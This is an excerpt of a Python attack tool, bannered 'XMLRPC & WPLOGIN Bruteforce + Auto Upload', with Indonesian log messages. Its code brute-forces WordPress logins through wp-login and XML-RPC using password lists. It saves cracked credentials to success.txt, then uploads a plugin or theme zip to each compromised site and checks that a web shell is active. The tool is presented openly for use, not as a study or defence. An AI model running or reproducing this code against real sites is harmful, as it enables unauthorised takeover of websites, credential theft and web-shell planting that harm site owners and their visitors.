...
banner = f"""{g}
 __    __  ____       ____   ____  __ __  ______    ___ 
|  |__|  ||    \     |    \ |    \|  |  ||      |  /  _]
|  |  |  ||  o  )    |  o  )|  D  )  |  ||      | /  [_ 
|  |  |  ||   _/     |     ||    /|  |  ||_|  |_||    _]
|  `  '  ||  |       |  O  ||    \|  :  |  |  |  |   [_ 
 \      / |  |       |     ||  .  \     |  |  |  |     |
  \_/\_/  |__|       |_____||__|\_|\__,_|  |__|  |_____|

{wh}[{g}+{wh}] XMLRPC & WPLOGIN Bruteforce + Auto Upload Made with 💖 By '/Mine7
...
def load_local_ssl():
    ...
    try:
        if os.name == 'nt':  
            ctypes.WinDLL(os.path.join(dll_dir, 'libeay32.dll'))
            ctypes.WinDLL(os.path.join(dll_dir, 'ssleay32.dll'))
            print("[INFO] Loaded local OpenSSL DLLs.")
    except Exception as e:
        print(f"[WARNING] Gagal load OpenSSL DLL lokal: {e}")
...
class WPBrute:
    ...
    async def upload_file(self, client, url, file_path, file_type):
        try:
            ...
            if not nonce_match:
                print(f"[FAILED] Tidak dapat ambil nonce dari {url}")
                return False
            ...
            if "successfully" in r.text.lower():
                ...
                if verify_shell(full_url):
                    print(f"[SUCCESS] Plugin berhasil di-inject dan aktif di {full_url}")
                ...
                print(f"[INFO] {file_type.capitalize()} sudah ada di {url}")
            else:
                print(f"[FAILED] Upload {file_type} gagal ke {url}")
        except Exception as e:
            print(f"[ERROR] Upload {file_type} error di {url}: {e}")
        return False
                ...
                for username in usernames:
                    ...
                    async for password in read_passwords_lazy(self.passwd_file):
                        ...
                        if success_wp or success_xmlrpc:
                            ...
                            with open("success.txt", "a", encoding='utf-8', errors='ignore') as f:
                                f.write(f"{url} -> {username}:{real_password}\n")

                            plugin_uploaded = False
                            theme_uploaded = False

                            if os.path.exists("plugin-inmymine.zip"):
                                plugin_uploaded = await self.upload_file(client, url, "plugin-inmymine.zip", "plugin")
                            if os.path.exists("theme-inmymine.zip"):
                                theme_uploaded = await self.upload_file(client, url, "theme-inmymine.zip", "theme")

                            if not plugin_uploaded and not theme_uploaded:
                                with open("failed.txt", "a", encoding='utf-8', errors='ignore') as f:
...
async def main():
    ...
    if not passwd_file:
        print("[ERROR] No password file selected.")
        return
    if not os.path.isfile(passwd_file):
        print(f"[ERROR] File not found: {passwd_file}")
        return
